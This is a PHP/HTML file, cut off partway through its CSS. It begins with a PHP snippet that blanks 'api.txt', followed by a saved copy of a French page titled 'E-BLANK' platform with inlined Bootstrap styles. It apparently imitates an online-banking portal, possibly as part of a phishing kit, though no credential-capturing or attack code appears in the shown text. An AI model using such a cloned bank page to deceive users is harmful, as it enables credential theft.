﻿<?php

 $blank_page = ' ';
 $up_file = fopen("api.txt", "w");
 fwrite($up_file, $blank_page);



?>
<!DOCTYPE html>
<html class="ng-scope">
  <head>
    <link rel="icon" href="" />
    <style>
      @charset "UTF-8";
      [ng\:cloak],
      [ng-cloak],
      [data-ng-cloak],
      [x-ng-cloak],
      .ng-cloak,
      .x-ng-cloak,
      .ng-hide:not(.ng-hide-animate) {
        display: none !important;
      }
      ng\:form {
        display: block;
      }
      .ng-animate-shim {
        visibility: hidden;
      }
      .ng-anchor {
        position: absolute;
      }
    </style>
    <meta charset="utf-8" />
    <meta name="description" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title class="ng-binding">BIENVENUE SUR VOTRE PLATEFORME E-BLANK</title>

    <style >
      /*!
 * Bootstrap v3.3.7 (http://getbootstrap.com)
 * Copyright 2011-2016 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */ /*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */
      html {
        font-family: sans-serif;
        -webkit-text-size-adjust: 100%;
        -ms-text-size-adjust: 100%;
      }
      body {
        margin: 0;
      }
      article,
      aside,
      details,
      figcaption,
      figure,
      footer,
      header,
      hgroup,
      main,
      menu,
      nav,
      section,
      summary {
        display: block;
      }
      audio,
      canvas,
      progress,
      video {
        display: inline-block;
        vertical-align: baseline;
      }
      audio:not([controls]) {
        display: none;
        height: 0;
      }
      [hidden],
      template {
        display: none;
      }
      a {
        background-color: transparent;
      }
      a:active,
      a:hover {
        outline: 0;
      }
      abbr[title] {
        border-bottom: 1px dotted;
      }
      b,
      strong {
        font-weight: 700;
      }
      dfn {
        font-style: italic;
      }
      h1 {
        margin: 0.67em 0;
        font-size: 2em;
      }
      mark {
        color: #000;
        background: #ff0;
      }
      small {
        font-size: 80%;
      }
      sub,
      sup {
        position: relative;
        font-size: 75%;
        line-height: 0;
        vertical-align: baseline;
      }
      sup {
        top: -0.5em;
      }
      sub {
        bottom: -0.25em;
      }
      img {
        border: 0;
      }
      svg:not(:root) {
        overflow: hidden;
      }
      figure {
        margin: 1em 40px;
      }
      hr {
        height: 0;
        -webkit-box-sizing: content-box;
        -moz-box-sizing: content-box;
        box-sizing: content-box;
      }
      pre {
        overflow: auto;
      }
      code,
      kbd,
      pre,
      samp {
        font-family: monospace, monospace;
        font-size: 1em;
      }
      button,
      input,
      optgroup,
      select,
      textarea {
        margin: 0;
        font: inherit;
        color: inherit;
      }
      button {
        overflow: visible;
      }
      button,
      select {
        text-transform: none;
      }
      button,
      html input[type="button"],
      input[type="reset"],
      input[type="submit"] {
        -webkit-appearance: button;
        cursor: pointer;
      }
      button[disabled],
      html input[disabled] {
        cursor: default;
      }
      button::-moz-focus-inner,
      input::-moz-focus-inner {
        padding: 0;
        border: 0;
      }
      input {
        line-height: normal;
      }
      input[type="checkbox"],
      input[type="radio"] {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
        padding: 0;
      }
      input[type="number"]::-webkit-inner-spin-button,
      input[type="number"]::-webkit-outer-spin-button {
        height: auto;
      }
      input[type="search"] {
        -webkit-box-sizing: content-box;
        -moz-box-sizing: content-box;
        box-sizing: content-box;
        -webkit-appearance: textfield;
      }
      input[type="search"]::-webkit-search-cancel-button,
      input[type="search"]::-webkit-search-decoration {
        -webkit-appearance: none;
      }
      fieldset {
        padding: 0.35em 0.625em 0.75em;
        margin: 0 2px;
        border: 1px solid silver;
      }
      legend {
        padding: 0;
        border: 0;
      }
      textarea {
        overflow: auto;
      }
      optgroup {
        font-weight: 700;
      }
      table {
        border-spacing: 0;
        border-collapse: collapse;
      }
      td,
      th {
        padding: 0;
      } /*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */
      @media print {
        *,
        :after,
        :before {
          color: #000 !important;
          text-shadow: none !important;
          background: 0 0 !important;
          -webkit-box-shadow: none !important;
          box-shadow: none !important;
        }
        a,
        a:visited {
          text-decoration: underline;
        }
        a[href]:after {
          content: " (" attr(href) ")";
        }
        abbr[title]:after {
          content: " (" attr(title) ")";
        }
        a[href^="javascript:"]:after,
        a[href^="#"]:after {
          content: "";
        }
        blockquote,
        pre {
          border: 1px solid #999;
          page-break-inside: avoid;
        }
        thead {
          display: table-header-group;
        }
        img,
        tr {
          page-break-inside: avoid;
        }
        img {
          max-width: 100% !important;
        }
        h2,
        h3,
        p {
          orphans: 3;
          widows: 3;
        }
        h2,
        h3 {
          page-break-after: avoid;
        }
        .navbar {
          display: none;
        }
        .btn > .caret,
        .dropup > .btn > .caret {
          border-top-color: #000 !important;
        }
        .label {
          border: 1px solid #000;
        }
        .table {
          border-collapse: collapse !important;
        }
        .table td,
        .table th {
          background-color: #fff !important;
        }
        .table-bordered td,
        .table-bordered th {
          border: 1px solid #ddd !important;
        }
      }
      @font-face {
        font-family: "Glyphicons Halflings";
        src:/*savepage-url=../../fonts/glyphicons-halflings-regular.eot*/ url();
        src:/*savepage-url=../../fonts/glyphicons-halflings-regular.eot?#iefix*/ url() format("embedded-opentype"), /*savepage-url=../../fonts/glyphicons-halflings-regular.woff2*/ url() format("woff2"),
          /*savepage-url=../../fonts/glyphicons-halflings-regular.woff*/ url() format("woff"), /*savepage-url=../../fonts/glyphicons-halflings-regular.ttf*/ url() format("truetype"),
          /*savepage-url=../../fonts/glyphicons-halflings-regular.svg#glyphicons_halflingsregular*/ url() format("svg");
      }
      .glyphicon {
        position: relative;
        top: 1px;
        display: inline-block;
        font-family: "Glyphicons Halflings";
        font-style: normal;
        font-weight: 400;
        line-height: 1;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
      }
      .glyphicon-asterisk:before {
        content: "\002a";
      }
      .glyphicon-plus:before {
        content: "\002b";
      }
      .glyphicon-eur:before,
      .glyphicon-euro:before {
        content: "\20ac";
      }
      .glyphicon-minus:before {
        content: "\2212";
      }
      .glyphicon-cloud:before {
        content: "\2601";
      }
      .glyphicon-envelope:before {
        content: "\2709";
      }
      .glyphicon-pencil:before {
        content: "\270f";
      }
      .glyphicon-glass:before {
        content: "\e001";
      }
      .glyphicon-music:before {
        content: "\e002";
      }
      .glyphicon-search:before {
        content: "\e003";
      }
      .glyphicon-heart:before {
        content: "\e005";
      }
      .glyphicon-star:before {
        content: "\e006";
      }
      .glyphicon-star-empty:before {
        content: "\e007";
      }
      .glyphicon-user:before {
        content: "\e008";
      }
      .glyphicon-film:before {
        content: "\e009";
      }
      .glyphicon-th-large:before {
        content: "\e010";
      }
      .glyphicon-th:before {
        content: "\e011";
      }
      .glyphicon-th-list:before {
        content: "\e012";
      }
      .glyphicon-ok:before {
        content: "\e013";
      }
      .glyphicon-remove:before {
        content: "\e014";
      }
      .glyphicon-zoom-in:before {
        content: "\e015";
      }
      .glyphicon-zoom-out:before {
        content: "\e016";
      }
      .glyphicon-off:before {
        content: "\e017";
      }
      .glyphicon-signal:before {
        content: "\e018";
      }
      .glyphicon-cog:before {
        content: "\e019";
      }
      .glyphicon-trash:before {
        content: "\e020";
      }
      .glyphicon-home:before {
        content: "\e021";
      }
      .glyphicon-file:before {
        content: "\e022";
      }
      .glyphicon-time:before {
        content: "\e023";
      }
      .glyphicon-road:before {
        content: "\e024";
      }
      .glyphicon-download-alt:before {
        content: "\e025";
      }
      .glyphicon-download:before {
        content: "\e026";
      }
      .glyphicon-upload:before {
        content: "\e027";
      }
      .glyphicon-inbox:before {
        content: "\e028";
      }
      .glyphicon-play-circle:before {
        content: "\e029";
      }
      .glyphicon-repeat:before {
        content: "\e030";
      }
      .glyphicon-refresh:before {
        content: "\e031";
      }
      .glyphicon-list-alt:before {
        content: "\e032";
      }
      .glyphicon-lock:before {
        content: "\e033";
      }
      .glyphicon-flag:before {
        content: "\e034";
      }
      .glyphicon-headphones:before {
        content: "\e035";
      }
      .glyphicon-volume-off:before {
        content: "\e036";
      }
      .glyphicon-volume-down:before {
        content: "\e037";
      }
      .glyphicon-volume-up:before {
        content: "\e038";
      }
      .glyphicon-qrcode:before {
        content: "\e039";
      }
      .glyphicon-barcode:before {
        content: "\e040";
      }
      .glyphicon-tag:before {
        content: "\e041";
      }
      .glyphicon-tags:before {
        content: "\e042";
      }
      .glyphicon-book:before {
        content: "\e043";
      }
      .glyphicon-bookmark:before {
        content: "\e044";
      }
      .glyphicon-print:before {
        content: "\e045";
      }
      .glyphicon-camera:before {
        content: "\e046";
      }
      .glyphicon-font:before {
        content: "\e047";
      }
      .glyphicon-bold:before {
        content: "\e048";
      }
      .glyphicon-italic:before {
        content: "\e049";
      }
      .glyphicon-text-height:before {
        content: "\e050";
      }
      .glyphicon-text-width:before {
        content: "\e051";
      }
      .glyphicon-align-left:before {
        content: "\e052";
      }
      .glyphicon-align-center:before {
        content: "\e053";
      }
      .glyphicon-align-right:before {
        content: "\e054";
      }
      .glyphicon-align-justify:before {
        content: "\e055";
      }
      .glyphicon-list:before {
        content: "\e056";
      }
      .glyphicon-indent-left:before {
        content: "\e057";
      }
      .glyphicon-indent-right:before {
        content: "\e058";
      }
      .glyphicon-facetime-video:before {
        content: "\e059";
      }
      .glyphicon-picture:before {
        content: "\e060";
      }
      .glyphicon-map-marker:before {
        content: "\e062";
      }
      .glyphicon-adjust:before {
        content: "\e063";
      }
      .glyphicon-tint:before {
        content: "\e064";
      }
      .glyphicon-edit:before {
        content: "\e065";
      }
      .glyphicon-share:before {
        content: "\e066";
      }
      .glyphicon-check:before {
        content: "\e067";
      }
      .glyphicon-move:before {
        content: "\e068";
      }
      .glyphicon-step-backward:before {
        content: "\e069";
      }
      .glyphicon-fast-backward:before {
        content: "\e070";
      }
      .glyphicon-backward:before {
        content: "\e071";
      }
      .glyphicon-play:before {
        content: "\e072";
      }
      .glyphicon-pause:before {
        content: "\e073";
      }
      .glyphicon-stop:before {
        content: "\e074";
      }
      .glyphicon-forward:before {
        content: "\e075";
      }
      .glyphicon-fast-forward:before {
        content: "\e076";
      }
      .glyphicon-step-forward:before {
        content: "\e077";
      }
      .glyphicon-eject:before {
        content: "\e078";
      }
      .glyphicon-chevron-left:before {
        content: "\e079";
      }
      .glyphicon-chevron-right:before {
        content: "\e080";
      }
      .glyphicon-plus-sign:before {
        content: "\e081";
      }
      .glyphicon-minus-sign:before {
        content: "\e082";
      }
      .glyphicon-remove-sign:before {
        content: "\e083";
      }
      .glyphicon-ok-sign:before {
        content: "\e084";
      }
      .glyphicon-question-sign:before {
        content: "\e085";
      }
      .glyphicon-info-sign:before {
        content: "\e086";
      }
      .glyphicon-screenshot:before {
        content: "\e087";
      }
      .glyphicon-remove-circle:before {
        content: "\e088";
      }
      .glyphicon-ok-circle:before {
        content: "\e089";
      }
      .glyphicon-ban-circle:before {
        content: "\e090";
      }
      .glyphicon-arrow-left:before {
        content: "\e091";
      }
      .glyphicon-arrow-right:before {
        content: "\e092";
      }
      .glyphicon-arrow-up:before {
        content: "\e093";
      }
      .glyphicon-arrow-down:before {
        content: "\e094";
      }
      .glyphicon-share-alt:before {
        content: "\e095";
      }
      .glyphicon-resize-full:before {
        content: "\e096";
      }
      .glyphicon-resize-small:before {
        content: "\e097";
      }
      .glyphicon-exclamation-sign:before {
        content: "\e101";
      }
      .glyphicon-gift:before {
        content: "\e102";
      }
      .glyphicon-leaf:before {
        content: "\e103";
      }
      .glyphicon-fire:before {
        content: "\e104";
      }
      .glyphicon-eye-open:before {
        content: "\e105";
      }
      .glyphicon-eye-close:before {
        content: "\e106";
      }
      .glyphicon-warning-sign:before {
        content: "\e107";
      }
      .glyphicon-plane:before {
        content: "\e108";
      }
      .glyphicon-calendar:before {
        content: "\e109";
      }
      .glyphicon-random:before {
        content: "\e110";
      }
      .glyphicon-comment:before {
        content: "\e111";
      }
      .glyphicon-magnet:before {
        content: "\e112";
      }
      .glyphicon-chevron-up:before {
        content: "\e113";
      }
      .glyphicon-chevron-down:before {
        content: "\e114";
      }
      .glyphicon-retweet:before {
        content: "\e115";
      }
      .glyphicon-shopping-cart:before {
        content: "\e116";
      }
      .glyphicon-folder-close:before {
        content: "\e117";
      }
      .glyphicon-folder-open:before {
        content: "\e118";
      }
      .glyphicon-resize-vertical:before {
        content: "\e119";
      }
      .glyphicon-resize-horizontal:before {
        content: "\e120";
      }
      .glyphicon-hdd:before {
        content: "\e121";
      }
      .glyphicon-bullhorn:before {
        content: "\e122";
      }
      .glyphicon-bell:before {
        content: "\e123";
      }
      .glyphicon-certificate:before {
        content: "\e124";
      }
      .glyphicon-thumbs-up:before {
        content: "\e125";
      }
      .glyphicon-thumbs-down:before {
        content: "\e126";
      }
      .glyphicon-hand-right:before {
        content: "\e127";
      }
      .glyphicon-hand-left:before {
        content: "\e128";
      }
      .glyphicon-hand-up:before {
        content: "\e129";
      }
      .glyphicon-hand-down:before {
        content: "\e130";
      }
      .glyphicon-circle-arrow-right:before {
        content: "\e131";
      }
      .glyphicon-circle-arrow-left:before {
        content: "\e132";
      }
      .glyphicon-circle-arrow-up:before {
        content: "\e133";
      }
      .glyphicon-circle-arrow-down:before {
        content: "\e134";
      }
      .glyphicon-globe:before {
        content: "\e135";
      }
      .glyphicon-wrench:before {
        content: "\e136";
      }
      .glyphicon-tasks:before {
        content: "\e137";
      }
      .glyphicon-filter:before {
        content: "\e138";
      }
      .glyphicon-briefcase:before {
        content: "\e139";
      }
      .glyphicon-fullscreen:before {
        content: "\e140";
      }
      .glyphicon-dashboard:before {
        content: "\e141";
      }
      .glyphicon-paperclip:before {
        content: "\e142";
      }
      .glyphicon-heart-empty:before {
        content: "\e143";
      }
      .glyphicon-link:before {
        content: "\e144";
      }
      .glyphicon-phone:before {
        content: "\e145";
      }
      .glyphicon-pushpin:before {
        content: "\e146";
      }
      .glyphicon-usd:before {
        content: "\e148";
      }
      .glyphicon-gbp:before {
        content: "\e149";
      }
      .glyphicon-sort:before {
        content: "\e150";
      }
      .glyphicon-sort-by-alphabet:before {
        content: "\e151";
      }
      .glyphicon-sort-by-alphabet-alt:before {
        content: "\e152";
      }
      .glyphicon-sort-by-order:before {
        content: "\e153";
      }
      .glyphicon-sort-by-order-alt:before {
        content: "\e154";
      }
      .glyphicon-sort-by-attributes:before {
        content: "\e155";
      }
      .glyphicon-sort-by-attributes-alt:before {
        content: "\e156";
      }
      .glyphicon-unchecked:before {
        content: "\e157";
      }
      .glyphicon-expand:before {
        content: "\e158";
      }
      .glyphicon-collapse-down:before {
        content: "\e159";
      }
      .glyphicon-collapse-up:before {
        content: "\e160";
      }
      .glyphicon-log-in:before {
        content: "\e161";
      }
      .glyphicon-flash:before {
        content: "\e162";
      }
      .glyphicon-log-out:before {
        content: "\e163";
      }
      .glyphicon-new-window:before {
        content: "\e164";
      }
      .glyphicon-record:before {
        content: "\e165";
      }
      .glyphicon-save:before {
        content: "\e166";
      }
      .glyphicon-open:before {
        content: "\e167";
      }
      .glyphicon-saved:before {
        content: "\e168";
      }
      .glyphicon-import:before {
        content: "\e169";
      }
      .glyphicon-export:before {
        content: "\e170";
      }
      .glyphicon-send:before {
        content: "\e171";
      }
      .glyphicon-floppy-disk:before {
        content: "\e172";
      }
      .glyphicon-floppy-saved:before {
        content: "\e173";
      }
      .glyphicon-floppy-remove:before {
        content: "\e174";
      }
      .glyphicon-floppy-save:before {
        content: "\e175";
      }
      .glyphicon-floppy-open:before {
        content: "\e176";
      }
      .glyphicon-credit-card:before {
        content: "\e177";
      }
      .glyphicon-transfer:before {
        content: "\e178";
      }
      .glyphicon-cutlery:before {
        content: "\e179";
      }
      .glyphicon-header:before {
        content: "\e180";
      }
      .glyphicon-compressed:before {
        content: "\e181";
      }
      .glyphicon-earphone:before {
        content: "\e182";
      }
      .glyphicon-phone-alt:before {
        content: "\e183";
      }
      .glyphicon-tower:before {
        content: "\e184";
      }
      .glyphicon-stats:before {
        content: "\e185";
      }
      .glyphicon-sd-video:before {
        content: "\e186";
      }
      .glyphicon-hd-video:before {
        content: "\e187";
      }
      .glyphicon-subtitles:before {
        content: "\e188";
      }
      .glyphicon-sound-stereo:before {
        content: "\e189";
      }
      .glyphicon-sound-dolby:before {
        content: "\e190";
      }
      .glyphicon-sound-5-1:before {
        content: "\e191";
      }
      .glyphicon-sound-6-1:before {
        content: "\e192";
      }
      .glyphicon-sound-7-1:before {
        content: "\e193";
      }
      .glyphicon-copyright-mark:before {
        content: "\e194";
      }
      .glyphicon-registration-mark:before {
        content: "\e195";
      }
      .glyphicon-cloud-download:before {
        content: "\e197";
      }
      .glyphicon-cloud-upload:before {
        content: "\e198";
      }
      .glyphicon-tree-conifer:before {
        content: "\e199";
      }
      .glyphicon-tree-deciduous:before {
        content: "\e200";
      }
      .glyphicon-cd:before {
        content: "\e201";
      }
      .glyphicon-save-file:before {
        content: "\e202";
      }
      .glyphicon-open-file:before {
        content: "\e203";
      }
      .glyphicon-level-up:before {
        content: "\e204";
      }
      .glyphicon-copy:before {
        content: "\e205";
      }
      .glyphicon-paste:before {
        content: "\e206";
      }
      .glyphicon-alert:before {
        content: "\e209";
      }
      .glyphicon-equalizer:before {
        content: "\e210";
      }
      .glyphicon-king:before {
        content: "\e211";
      }
      .glyphicon-queen:before {
        content: "\e212";
      }
      .glyphicon-pawn:before {
        content: "\e213";
      }
      .glyphicon-bishop:before {
        content: "\e214";
      }
      .glyphicon-knight:before {
        content: "\e215";
      }
      .glyphicon-baby-formula:before {
        content: "\e216";
      }
      .glyphicon-tent:before {
        content: "\26fa";
      }
      .glyphicon-blackboard:before {
        content: "\e218";
      }
      .glyphicon-bed:before {
        content: "\e219";
      }
      .glyphicon-apple:before {
        content: "\f8ff";
      }
      .glyphicon-erase:before {
        content: "\e221";
      }
      .glyphicon-hourglass:before {
        content: "\231b";
      }
      .glyphicon-lamp:before {
        content: "\e223";
      }
      .glyphicon-duplicate:before {
        content: "\e224";
      }
      .glyphicon-piggy-bank:before {
        content: "\e225";
      }
      .glyphicon-scissors:before {
        content: "\e226";
      }
      .glyphicon-bitcoin:before {
        content: "\e227";
      }
      .glyphicon-btc:before {
        content: "\e227";
      }
      .glyphicon-xbt:before {
        content: "\e227";
      }
      .glyphicon-yen:before {
        content: "\00a5";
      }
      .glyphicon-jpy:before {
        content: "\00a5";
      }
      .glyphicon-ruble:before {
        content: "\20bd";
      }
      .glyphicon-rub:before {
        content: "\20bd";
      }
      .glyphicon-scale:before {
        content: "\e230";
      }
      .glyphicon-ice-lolly:before {
        content: "\e231";
      }
      .glyphicon-ice-lolly-tasted:before {
        content: "\e232";
      }
      .glyphicon-education:before {
        content: "\e233";
      }
      .glyphicon-option-horizontal:before {
        content: "\e234";
      }
      .glyphicon-option-vertical:before {
        content: "\e235";
      }
      .glyphicon-menu-hamburger:before {
        content: "\e236";
      }
      .glyphicon-modal-window:before {
        content: "\e237";
      }
      .glyphicon-oil:before {
        content: "\e238";
      }
      .glyphicon-grain:before {
        content: "\e239";
      }
      .glyphicon-sunglasses:before {
        content: "\e240";
      }
      .glyphicon-text-size:before {
        content: "\e241";
      }
      .glyphicon-text-color:before {
        content: "\e242";
      }
      .glyphicon-text-background:before {
        content: "\e243";
      }
      .glyphicon-object-align-top:before {
        content: "\e244";
      }
      .glyphicon-object-align-bottom:before {
        content: "\e245";
      }
      .glyphicon-object-align-horizontal:before {
        content: "\e246";
      }
      .glyphicon-object-align-left:before {
        content: "\e247";
      }
      .glyphicon-object-align-vertical:before {
        content: "\e248";
      }
      .glyphicon-object-align-right:before {
        content: "\e249";
      }
      .glyphicon-triangle-right:before {
        content: "\e250";
      }
      .glyphicon-triangle-left:before {
        content: "\e251";
      }
      .glyphicon-triangle-bottom:before {
        content: "\e252";
      }
      .glyphicon-triangle-top:before {
        content: "\e253";
      }
      .glyphicon-console:before {
        content: "\e254";
      }
      .glyphicon-superscript:before {
        content: "\e255";
      }
      .glyphicon-subscript:before {
        content: "\e256";
      }
      .glyphicon-menu-left:before {
        content: "\e257";
      }
      .glyphicon-menu-right:before {
        content: "\e258";
      }
      .glyphicon-menu-down:before {
        content: "\e259";
      }
      .glyphicon-menu-up:before {
        content: "\e260";
      }
      * {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }
      :after,
      :before {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }
      html {
        font-size: 10px;
        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
      }
      body {
        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-size: 14px;
        line-height: 1.42857143;
        color: #333;
        background-color: #fff;
      }
      button,
      input,
      select,
      textarea {
        font-family: inherit;
        font-size: inherit;
        line-height: inherit;
      }
      a {
        color: #337ab7;
        text-decoration: none;
      }
      a:focus,
      a:hover {
        color: #23527c;
        text-decoration: underline;
      }
      a:focus {
        outline: 5px auto -webkit-focus-ring-color;
        outline-offset: -2px;
      }
      figure {
        margin: 0;
      }
      img {
        vertical-align: middle;
      }
      .carousel-inner > .item > a > img,
      .carousel-inner > .item > img,
      .img-responsive,
      .thumbnail a > img,
      .thumbnail > img {
        display: block;
        max-width: 100%;
        height: auto;
      }
      .img-rounded {
        border-radius: 6px;
      }
      .img-thumbnail {
        display: inline-block;
        max-width: 100%;
        height: auto;
        padding: 4px;
        line-height: 1.42857143;
        background-color: #fff;
        border: 1px solid #ddd;
        border-radius: 4px;
        -webkit-transition: all 0.2s ease-in-out;
        -o-transition: all 0.2s ease-in-out;
        transition: all 0.2s ease-in-out;
      }
      .img-circle {
        border-radius: 50%;
      }
      hr {
        margin-top: 20px;
        margin-bottom: 20px;
        border: 0;
        border-top: 1px solid #eee;
      }
      .sr-only {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0;
      }
      .sr-only-focusable:active,
      .sr-only-focusable:focus {
        position: static;
        width: auto;
        height: auto;
        margin: 0;
        overflow: visible;
        clip: auto;
      }
      [role="button"] {
        cursor: pointer;
      }
      .h1,
      .h2,
      .h3,
      .h4,
      .h5,
      .h6,
      h1,
      h2,
      h3,
      h4,
      h5,
      h6 {
        font-family: inherit;
        font-weight: 500;
        line-height: 1.1;
        color: inherit;
      }
      .h1 .small,
      .h1 small,
      .h2 .small,
      .h2 small,
      .h3 .small,
      .h3 small,
      .h4 .small,
      .h4 small,
      .h5 .small,
      .h5 small,
      .h6 .small,
      .h6 small,
      h1 .small,
      h1 small,
      h2 .small,
      h2 small,
      h3 .small,
      h3 small,
      h4 .small,
      h4 small,
      h5 .small,
      h5 small,
      h6 .small,
      h6 small {
        font-weight: 400;
        line-height: 1;
        color: #777;
      }
      .h1,
      .h2,
      .h3,
      h1,
      h2,
      h3 {
        margin-top: 20px;
        margin-bottom: 10px;
      }
      .h1 .small,
      .h1 small,
      .h2 .small,
      .h2 small,
      .h3 .small,
      .h3 small,
      h1 .small,
      h1 small,
      h2 .small,
      h2 small,
      h3 .small,
      h3 small {
        font-size: 65%;
      }
      .h4,
      .h5,
      .h6,
      h4,
      h5,
      h6 {
        margin-top: 10px;
        margin-bottom: 10px;
      }
      .h4 .small,
      .h4 small,
      .h5 .small,
      .h5 small,
      .h6 .small,
      .h6 small,
      h4 .small,
      h4 small,
      h5 .small,
      h5 small,
      h6 .small,
      h6 small {
        font-size: 75%;
      }
      .h1,
      h1 {
        font-size: 36px;
      }
      .h2,
      h2 {
        font-size: 30px;
      }
      .h3,
      h3 {
        font-size: 24px;
      }
      .h4,
      h4 {
        font-size: 18px;
      }
      .h5,
      h5 {
        font-size: 14px;
      }
      .h6,
      h6 {
        font-size: 12px;
      }
      p {
        margin: 0 0 10px;
      }
      .lead {
        margin-bottom: 20px;
        font-size: 16px;
        font-weight: 300;
        line-height: 1.4;
      }
      @media (min-width: 768px) {
        .lead {
          font-size: 21px;
        }
      }
      .small,
      small {
        font-size: 85%;
      }
      .mark,
      mark {
        padding: 0.2em;
        background-color: #fcf8e3;
      }
      .text-left {
        text-align: left;
      }
      .text-right {
        text-align: right;
      }
      .text-center {
        text-align: center;
      }
      .text-justify {
        text-align: justify;
      }
      .text-nowrap {
        white-space: nowrap;
      }
      .text-lowercase {
        text-transform: lowercase;
      }
      .text-uppercase {
        text-transform: uppercase;
      }
      .text-capitalize {
        text-transform: capitalize;
      }
      .text-muted {
        color: #777;
      }
      .text-primary {
        color: #337ab7;
      }
      a.text-primary:focus,
      a.text-primary:hover {
        color: #286090;
      }
      .text-success {
        color: #3c763d;
      }
      a.text-success:focus,
      a.text-success:hover {
        color: #2b542c;
      }
      .text-info {
        color: #31708f;
      }
      a.text-info:focus,
      a.text-info:hover {
        color: #245269;
      }
      .text-warning {
        color: #8a6d3b;
      }
      a.text-warning:focus,
      a.text-warning:hover {
        color: #66512c;
      }
      .text-danger {
        color: #a94442;
      }
      a.text-danger:focus,
      a.text-danger:hover {
        color: #843534;
      }
      .bg-primary {
        color: #fff;
        background-color: #337ab7;
      }
      a.bg-primary:focus,
      a.bg-primary:hover {
        background-color: #286090;
      }
      .bg-success {
        background-color: #dff0d8;
      }
      a.bg-success:focus,
      a.bg-success:hover {
        background-color: #c1e2b3;
      }
      .bg-info {
        background-color: #d9edf7;
      }
      a.bg-info:focus,
      a.bg-info:hover {
        background-color: #afd9ee;
      }
      .bg-warning {
        background-color: #fcf8e3;
      }
      a.bg-warning:focus,
      a.bg-warning:hover {
        background-color: #f7ecb5;
      }
      .bg-danger {
        background-color: #f2dede;
      }
      a.bg-danger:focus,
      a.bg-danger:hover {
        background-color: #e4b9b9;
      }
      .page-header {
        padding-bottom: 9px;
        margin: 40px 0 20px;
        border-bottom: 1px solid #eee;
      }
      ol,
      ul {
        margin-top: 0;
        margin-bottom: 10px;
      }
      ol ol,
      ol ul,
      ul ol,
      ul ul {
        margin-bottom: 0;
      }
      .list-unstyled {
        padding-left: 0;
        list-style: none;
      }
      .list-inline {
        padding-left: 0;
        margin-left: -5px;
        list-style: none;
      }
      .list-inline > li {
        display: inline-block;
        padding-right: 5px;
        padding-left: 5px;
      }
      dl {
        margin-top: 0;
        margin-bottom: 20px;
      }
      dd,
      dt {
        line-height: 1.42857143;
      }
      dt {
        font-weight: 700;
      }
      dd {
        margin-left: 0;
      }
      @media (min-width: 768px) {
        .dl-horizontal dt {
          float: left;
          width: 160px;
          overflow: hidden;
          clear: left;
          text-align: right;
          text-overflow: ellipsis;
          white-space: nowrap;
        }
        .dl-horizontal dd {
          margin-left: 180px;
        }
      }
      abbr[data-original-title],
      abbr[title] {
        cursor: help;
        border-bottom: 1px dotted #777;
      }
      .initialism {
        font-size: 90%;
        text-transform: uppercase;
      }
      blockquote {
        padding: 10px 20px;
        margin: 0 0 20px;
        font-size: 17.5px;
        border-left: 5px solid #eee;
      }
      blockquote ol:last-child,
      blockquote p:last-child,
      blockquote ul:last-child {
        margin-bottom: 0;
      }
      blockquote .small,
      blockquote footer,
      blockquote small {
        display: block;
        font-size: 80%;
        line-height: 1.42857143;
        color: #777;
      }
      blockquote .small:before,
      blockquote footer:before,
      blockquote small:before {
        content: "\2014 \00A0";
      }
      .blockquote-reverse,
      blockquote.pull-right {
        padding-right: 15px;
        padding-left: 0;
        text-align: right;
        border-right: 5px solid #eee;
        border-left: 0;
      }
      .blockquote-reverse .small:before,
      .blockquote-reverse footer:before,
      .blockquote-reverse small:before,
      blockquote.pull-right .small:before,
      blockquote.pull-right footer:before,
      blockquote.pull-right small:before {
        content: "";
      }
      .blockquote-reverse .small:after,
      .blockquote-reverse footer:after,
      .blockquote-reverse small:after,
      blockquote.pull-right .small:after,
      blockquote.pull-right footer:after,
      blockquote.pull-right small:after {
        content: "\00A0 \2014";
      }
      address {
        margin-bottom: 20px;
        font-style: normal;
        line-height: 1.42857143;
      }
      code,
      kbd,
      pre,
      samp {
        font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
      }
      code {
        padding: 2px 4px;
        font-size: 90%;
        color: #c7254e;
        background-color: #f9f2f4;
        border-radius: 4px;
      }
      kbd {
        padding: 2px 4px;
        font-size: 90%;
        color: #fff;
        background-color: #333;
        border-radius: 3px;
        -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.25);
        box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.25);
      }
      kbd kbd {
        padding: 0;
        font-size: 100%;
        font-weight: 700;
        -webkit-box-shadow: none;
        box-shadow: none;
      }
      pre {
        display: block;
        padding: 9.5px;
        margin: 0 0 10px;
        font-size: 13px;
        line-height: 1.42857143;
        color: #333;
        word-break: break-all;
        word-wrap: break-word;
        background-color: #f5f5f5;
        border: 1px solid #ccc;
        border-radius: 4px;
      }
      pre code {
        padding: 0;
        font-size: inherit;
        color: inherit;
        white-space: pre-wrap;
        background-color: transparent;
        border-radius: 0;
      }
      .pre-scrollable {
        max-height: 340px;
        overflow-y: scroll;
      }
      .container {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto;
      }
      @media (min-width: 768px) {
        .container {
          width: 750px;
        }
      }
      @media (min-width: 992px) {
        .container {
          width: 970px;
        }
      }
      @media (min-width: 1200px) {
        .container {
          width: 1170px;
        }
      }
      .container-fluid {
        padding-right: 15px;
        padding-left: 15px;
        margin-right: auto;
        margin-left: auto;
      }
      .row {
        margin-right: -15px;
        margin-left: -15px;
      }
      .col-lg-1,
      .col-lg-10,
      .col-lg-11,
      .col-lg-12,
      .col-lg-2,
      .col-lg-3,
      .col-lg-4,
      .col-lg-5,
      .col-lg-6,
      .col-lg-7,
      .col-lg-8,
      .col-lg-9,
      .col-md-1,
      .col-md-10,
      .col-md-11,
      .col-md-12,
      .col-md-2,
      .col-md-3,
